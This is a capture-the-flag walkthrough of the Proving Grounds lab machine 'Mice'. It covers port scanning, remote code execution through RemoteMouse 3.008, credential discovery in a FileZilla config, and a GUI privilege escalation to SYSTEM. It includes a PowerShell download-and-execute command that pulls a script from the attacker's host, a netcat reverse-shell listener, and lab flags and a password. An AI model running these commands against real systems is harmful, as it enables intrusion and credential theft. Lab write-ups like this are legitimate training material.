---
layout: writeup
name: "Mice"
platform: "ProvingGrounds"
category: "pg"
difficulty: "Easy"
permalink: /writeups/pg/mice/
os: "OffSec Proving Grounds"
date: 2026-02-25
pwned: true
---
# 🧪 Machine Name: Mice

**Platform:** OffSec Proving Grounds\
**IP Address:** `192.168.228.199`\
**Difficulty:** Easy

---

## 🧭 Overview

This PG machine exposes RemoteMouse and other uncommon ports. RemoteMouse 3.008 is known to be vulnerable to RCE. We leverage that to gain an initial foothold via a PowerShell reverse shell, then discover FileZilla credentials and escalate to Administrator via a known LPE vulnerability. Screenshots prove both user and root access.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -p- --min-rate 10000 192.168.228.199
PORT     STATE SERVICE
1978/tcp open  remotemouse
1979/tcp open  unisql-java
1980/tcp open  pearldoc-xact
3389/tcp open  ms-wbt-server
7680/tcp open  pando-pub
```

```bash
nmap -p 1978,1979,1980,3380,7680 -sCV -oN nmapscan 192.168.228.199
```

- `1978` identified as RemoteMouse

---

## ⚙️ Exploitation – RemoteMouse RCE

- Vulnerability: [RemoteMouse 3.008 Arbitrary RCE](https://www.exploit-db.com/exploits/46697)
- Tool used: [RemoteMouse-3.008-Exploit.py](https://github.com/p0dalirius/RemoteMouse-3.008-Exploit)

### 🔁 Hosted revshell:

```bash
# PowerShell revshell saved as own.ps1
sudo python3 -m http.server 80
```

### 🐭 Trigger exploit:

```bash
./RemoteMouse-3.008-Exploit.py --target-ip 192.168.228.199 \
  --cmd "powershell -c \"iex (New-Object Net.WebClient).DownloadString('http://192.168.45.206:80/own.ps1')\""
```

### 🖥️ Netcat shell (User)

```bash
nc -lvnp 443
whoami → remote-pc\divine
hostname → Remote-PC
type Desktop\local.txt → `7b179f432c64ed054f461afac5c5bdb0`
```
![Mice Local Proof](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/pg_mice_local.png)
---

## 🪜 Privilege Escalation

### 🔍 Credential Discovery

```bash
findstr /S /I /C:"pass" *.ini *.cfg *.config *.xml
```

- Found in: `C:\Users\divine\AppData\Roaming\FileZilla\recentservers.xml`
![Mice password](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/pg_mice_root2.png)
- Base64 decoded password: `ControlFreak11`

### 🎮 RDP login:

```bash
xfreerdp3 /v:192.168.228.199 /u:"divine" /p:"ControlFreak11" /f
```

### ⬆️ Admin Privesc – RemoteMouse GUI LPE

- [Exploit DB #50047](https://www.exploit-db.com/exploits/50047)
- Triggering RemoteMouse GUI LPE pops SYSTEM shell
![Remove mouse exploit](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/pg_mice_root1.png)
```cmd
whoami → nt authority\system
type Desktop\proof.txt → `5124eb2ab003150adea6c56b12755753`
```

---

## 📷 Proof
![ClamAV Proof](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/pg_mice_root.png)


---

## 💡 Lessons Learned

- RemoteMouse is a common vector and often appears in PG/HTB.
- Always check for saved application configs like FileZilla.
- GUI privilege escalation with a service path or auto-start is viable and easy to overlook.

---
"Writeup and proof included in GitHub repo: https://github.com/inkedqt/ctf-writeups/tree/main/Other/PG/Mice"
